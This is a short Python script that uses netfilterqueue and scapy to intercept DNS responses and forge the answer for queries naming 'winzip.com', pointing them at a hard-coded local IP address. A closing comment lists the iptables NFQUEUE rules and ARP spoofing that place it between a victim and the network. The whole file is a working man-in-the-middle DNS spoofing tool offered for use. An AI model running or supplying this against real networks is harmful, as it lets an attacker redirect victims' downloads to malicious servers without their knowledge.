import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "winzip.com" in str(qname):             # For all websites
            print("[+] Spoofing target")

            #answer = scapy.DNSRR(rrname=qname, rdata="192.168.42.128")

            answer = scapy.DNSRR(rrname=qname, rdata="192.168.165.59")  #Take spoof ip as an input
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(2, process_packet)

try:
    queue.run()

except KeyboardInterrupt:
    print("\n[-] Ctrl+C detected")
    print("[-] Quiting")


"""
remote computer -> iptables -I FORWARD -j NFQUEUE --queue-num_inp 0
                -> ARP spoofing for that compuet ip

self computer -> iptables -I OUTPUT -j NFQUEUE --queue-num_inp 0
              -> iptables -I INPUT -j NFQUEUE --queue-num_inp 0


"""
